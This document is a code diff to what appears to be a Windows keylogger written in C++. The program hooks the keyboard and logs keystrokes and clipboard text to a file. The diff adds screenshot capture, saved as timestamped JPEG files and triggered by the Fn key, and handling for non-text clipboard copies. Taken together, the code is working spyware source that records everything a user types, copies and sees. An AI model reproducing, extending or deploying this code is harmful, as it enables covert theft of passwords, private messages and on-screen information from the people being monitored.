@@ -7,6 +7,7 @@
 #include <winuser.h>
 #include <ctime>
 #include <chrono>
+#include <atlimage.h>
 
 /* these variables are called globally because there is no way to pass them to the hook callback function as an argument and are needed to update the log file
 
@@ -53,6 +54,8 @@ std::wstring getClipboardText(){
 	wchar_t *pszText = static_cast<wchar_t *>( GlobalLock(hdata) );
 	if (pszText == NULL){
 		std::cout << "w 3lach" << std::endl;
+		CloseClipboard();
+		return (L"[Non-Text Copy]");
 	}
 	std::wstring text(pszText);
 	CloseClipboard();
@@ -123,6 +126,25 @@ void writeClipboardChange(){
 	logfile << getClipboardText() << "*" << std::endl << std::endl;
 }
 
+std::string	getScreenFileName() {
+	struct tm* timeinfo;
+	char timestr[23];
+	time_t rawtime;
+
+	time(&rawtime);
+	timeinfo = localtime(&rawtime);
+	sprintf(timestr, "%02d-%02d-%d %02d_%02d_%02d.jpg", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
+	return (timestr);
+}
+
+void	saveScreenToFile(HBITMAP hBitmap){
+	CImage image;
+	image.Attach(hBitmap);
+	std::string filename = getScreenFileName();
+	std::cout << "filename : " << filename << std::endl;
+	std::cout << "HRESULT : " << image.Save(filename.c_str()) << std::endl;
+}
+
 void	takeScreen(){
 	int x1, y1, x2, y2, w, h;
 
@@ -147,11 +169,7 @@ void	takeScreen(){
     SetClipboardData(CF_BITMAP, hBitmap);
     CloseClipboard();
 	std::cout << "screen taken??" << std::endl;
-
-	//Sleep(400);
-	std::cout<<"Format Bitmap: "<<IsClipboardFormatAvailable(CF_BITMAP)<<"\n";
-    std::cout<<"Format DIB: "<<IsClipboardFormatAvailable(CF_DIB)<<"\n";
-    std::cout<<"Format DIBv5: "<<IsClipboardFormatAvailable(CF_DIBV5)<<"\n";
+	saveScreenToFile(hBitmap);
 }
 
 /* TranslateKeys() is called on each keypress and simply converts the key press from vkCode to a writable character
@@ -173,10 +191,8 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[SHIFT]";
 	else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
 		result = L"[CTRL]";
-	else if (vkCode == VK_LMENU || vkCode == VK_RMENU){
+	else if (vkCode == VK_LMENU || vkCode == VK_RMENU)
 		result = L"[ALT]";
-		takeScreen();
-	}
 	else if (vkCode == VK_CAPITAL)
 		result = L"[CAPS]";
 	else if (vkCode == VK_ESCAPE)
@@ -197,8 +213,10 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[NUMLOCK]";
 	else if (vkCode == VK_LWIN)
 		result = L"[WINDOWS]";
-	else if (vkCode == 255)
+	else if (vkCode == 255){
 		result = L"[FN]";
+		takeScreen();
+	}
 	else if (vkCode >= 112 && vkCode <=120){
 		result = L"[F";
 		result += (wchar_t)vkCode-63; // 112-63=49(ascii for '1');		
@@ -219,7 +237,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
 		if (GetKeyboardState(lpKeyState) == 0){
-			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling here
+			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling
 		}
 		int ret = ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
 		result += buff[0];
@@ -275,3 +293,5 @@ void main() {
     }
     UnhookWindowsHookEx(keyboard);
 }
+
+//qwqwqwqw!!!@@##asasasasqwqwqw
